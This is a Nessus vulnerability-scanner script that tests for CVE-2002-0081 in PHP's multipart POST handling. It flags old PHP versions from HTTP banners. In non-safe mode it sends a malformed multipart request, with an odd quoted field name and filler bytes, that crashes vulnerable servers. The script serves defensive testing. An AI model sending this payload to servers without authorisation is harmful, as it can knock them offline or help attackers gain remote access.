#
# This script was written by Thomas Reinke <reinke@securityspace.com>
#
# Modified by H D Moore & Renaud Deraison to actually test for the flaw
#
# See the Nessus Scripts License for details
#

if(description)
{
 script_id(10867);
 script_cve_id("CVE-2002-0081");
 script_bugtraq_id(4183);
 script_version("$Revision: 1.14 $");
 
 name["english"] = "php POST file uploads";

 script_name(english:name["english"]);
 
 desc["english"] = "
The remote host is running a version of PHP earlier
than 4.1.2.

There are several flaws in how PHP handles
multipart/form-data POST requests, any one of which can
allow an attacker to gain remote access to the system.

Solution : Upgrade to PHP 4.1.2
Risk factor : High";




 script_description(english:desc["english"], francais:desc["francais"]);
 
 summary["english"] = "Checks for version of PHP";
 summary["francais"] = "V�rifie la version de PHP";
 
 script_summary(english:summary["english"], francais:summary["francais"]);
 
 script_category(ACT_MIXED_ATTACK);
 
 
 script_copyright(english:"This script is Copyright (C) 2002 Thomas Reinke",
		francais:"Ce script est Copyright (C) 2001 Thomas Reinke");
 family["english"] = "CGI abuses";
 family["francais"] = "Abus de CGI";
 script_family(english:family["english"], francais:family["francais"]);
 script_dependencie("find_service.nes", "no404.nasl", "webmirror.nasl");
 script_require_ports("Services/www", 80);
 exit(0);
}

#
# The script code starts here
#

include("http_func.inc");

port = get_kb_item("Services/www");
if(!port)port = 80;
if(get_port_state(port))
{


 if(!safe_checks())
 {
  files = get_kb_list(string("www/", port, "/content/extensions/php*"));
 
  if(isnull(files))file = "/default.php";
  else {
  	files = make_list(files);
	file = files[0];
	}
  
  if(is_cgi_installed(item:file, port:port))
  {
   boundary1 = string("-NESSUS!");
   boundary2 = string("--NESSUS!");
   clen = "567";
   dblq = raw_string(0x22);
   badb = raw_string(0x12);


   postdata = string("POST ", file, " HTTP/1.1\r\n", "Host: ", get_host_name(), "\r\n");
   postdata = string(postdata, "Referer: http://", get_host_name(), "/", file, "\r\n");
   postdata = string(postdata, "Content-type: multipart/form-data; boundary=", boundary1, "\r\n");
   postdata = string(postdata, "Content-Length: ", clen, "\r\n\r\n", boundary2, "\r\n");
   postdata = string(postdata, "Content-Disposition: form-data; name=");
  


  len = strlen(dblq) + strlen(badb) + strlen(dblq);
  big = crap(clen - len);
  postdata = string(postdata, dblq, badb, dblq, big, dblq);
 
  soc = http_open_socket(port);
  if(!soc)exit(0);
 
  send(socket:soc, data:postdata);
  
  r = http_recv(socket:soc);
  http_close_socket(soc);
  if(!r)security_hole(port);
  exit(0);
  }
 }


 #
 # Fall back on pattern matching
 #

 banner = get_http_banner(port:port);
 if(!banner)exit(0);

 serv = strstr(banner, "Server");
 if(ereg(pattern:".*PHP/((3.*)|(4\.0.*)|(4\.1\.[01].*))", string:serv))
 {
   security_hole(port);
 }
 else
 {

   serv = strstr(banner, "X-Powered-By:");
   if(ereg(pattern:".*PHP/((3.*)|(4\.0.*)|(4\.1\.[01].*))", string:serv))
   {
     security_hole(port);
   }
 }
}
